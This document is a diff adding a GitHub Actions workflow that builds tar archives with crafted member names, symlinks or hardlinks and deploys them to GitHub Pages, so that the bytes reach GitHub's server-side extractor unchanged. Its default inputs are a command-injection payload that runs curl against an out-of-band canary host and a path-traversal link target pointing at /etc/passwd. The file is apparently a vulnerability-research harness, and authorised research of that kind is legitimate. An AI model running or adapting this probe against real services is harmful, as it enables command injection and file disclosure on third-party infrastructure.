@@ -1,0 +1,148 @@
+name: Pages Probe (manual)
+
+# Self-contained manual probe: Python crafts a tar with an arbitrary member
+# NAME field, uploads it as the `github-pages` artifact, then deploys it.
+# This bypasses upload-pages-artifact's re-tar step so the crafted bytes
+# reach the GitHub Pages server-side extractor verbatim.
+#
+# Dispatch inputs are the experiment knobs:
+#   payload      - string placed verbatim in the experiment entry's NAME field
+#   canary       - replaces the literal token CANARY in payload (oast/interactsh host)
+#   typeflag     - file (REG) / symlink (SYM) / hardlink (LNK)
+#   link_target  - target path for symlink/hardlink entries
+#   format       - ustar / gnu / pax  (long names need gnu or pax)
+#   include_index- add a valid index.html so the site can serve
+
+on:
+  workflow_dispatch:
+    inputs:
+      payload:
+        description: "Tar member NAME field (experiment string). Use CANARY as a placeholder + set canary, or write the full string."
+        required: true
+        default: "x';curl http://CANARY/t;#"
+      canary:
+        description: "Replaces token CANARY in payload (oast.live / interactsh host). Blank = keep payload literal."
+        required: false
+        default: ""
+      typeflag:
+        description: "Type of the experiment tar entry."
+        type: choice
+        options: [file, symlink, hardlink]
+        default: file
+      link_target:
+        description: "Target path for symlink/hardlink entries (only when typeflag is symlink/hardlink)."
+        required: false
+        default: "../../../../etc/passwd"
+      format:
+        description: "tar header format (names >=100 bytes need gnu or pax)."
+        type: choice
+        options: [ustar, gnu, pax]
+        default: ustar
+      include_index:
+        description: "Include a valid index.html so the site can actually serve."
+        type: boolean
+        default: true
+
+permissions:
+  contents: read
+  pages: write
+  id-token: write
+
+concurrency:
+  group: pages-probe-manual
+  cancel-in-progress: false
+
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    environment:
+      name: github-pages
+      url: ${{ steps.deploy.outputs.page_url }}
+    steps:
+      - name: Build crafted tarball
+        env:
+          INPUT_PAYLOAD: ${{ github.event.inputs.payload }}
+          INPUT_CANARY: ${{ github.event.inputs.canary }}
+          INPUT_TYPEFLAG: ${{ github.event.inputs.typeflag }}
+          INPUT_LINK_TARGET: ${{ github.event.inputs.link_target }}
+          INPUT_FORMAT: ${{ github.event.inputs.format }}
+          INPUT_INCLUDE_INDEX: ${{ github.event.inputs.include_index }}
+        run: |
+          set -eu
+          python3 - <<'PY'
+          import os, tarfile, io
+          payload      = os.environ['INPUT_PAYLOAD']
+          canary       = os.environ['INPUT_CANARY']
+          typeflag     = os.environ['INPUT_TYPEFLAG']
+          link_target  = os.environ['INPUT_LINK_TARGET']
+          include_index = os.environ['INPUT_INCLUDE_INDEX'] == 'true'
+          fmt = {
+              'ustar': tarfile.USTAR_FORMAT,
+              'gnu':   tarfile.GNU_FORMAT,
+              'pax':   tarfile.PAX_FORMAT,
+          }[os.environ['INPUT_FORMAT']]
+          if canary:
+              payload = payload.replace('CANARY', canary)
+          print(f"experiment name = {payload!r}")
+          print(f"typeflag={typeflag} format={os.environ['INPUT_FORMAT']} link_target={link_target!r}")
+          tar_path = 'artifact.tar'
+          with tarfile.open(tar_path, 'w', format=fmt) as t:
+              if include_index:
+                  data = b"<html><body>probe ok</body></html>\n"
+                  info = tarfile.TarInfo('index.html')
+                  info.size = len(data); info.mtime = 0
+                  t.addfile(info, io.BytesIO(data))
+              body = b"probe\n"
+              if typeflag == 'symlink':
+                  info = tarfile.TarInfo(payload)
+                  info.type = tarfile.SYMTYPE
+                  info.linkname = link_target
+                  info.mtime = 0
+                  t.addfile(info)
+              elif typeflag == 'hardlink':
+                  info = tarfile.TarInfo(payload)
+                  info.type = tarfile.LNKTYPE
+                  info.linkname = link_target
+                  info.mtime = 0
+                  t.addfile(info)
+              else:
+                  info = tarfile.TarInfo(payload)
+                  info.type = tarfile.REGTYPE
+                  info.size = len(body); info.mtime = 0
+                  t.addfile(info, io.BytesIO(body))
+          print("::group::Tar members")
+          with tarfile.open(tar_path) as t:
+              for m in t.getmembers():
+                  print(f"  name={m.name!r} type={m.type} link={m.linkname!r} size={m.size}")
+          print("::endgroup::")
+          print("::group::First header bytes (hex, first 160)")
+          with open(tar_path, 'rb') as f:
+              hdr = f.read(512)
+          print(''.join(f'{b:02x}' for b in hdr[:160]))
+          print("::endgroup::")
+          PY
+      - name: Upload Pages artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: github-pages
+          path: artifact.tar
+          if-no-files-found: error
+          retention-days: 1
+      - name: Deploy
+        id: deploy
+        uses: actions/deploy-pages@v4
+        with:
+          artifact_name: github-pages
+      - name: Probe deployed site
+        if: always()
+        continue-on-error: true
+        run: |
+          url="${{ steps.deploy.outputs.page_url }}"
+          echo "page_url=${url}"
+          if [ -n "$url" ]; then
+            sleep 5
+            echo "--- HEAD ---"; curl -sS -I "$url" | head -20
+            echo "--- GET / ---"; curl -sS "$url" | head -20
+          else
+            echo "no page_url (deploy did not succeed)"
+          fi
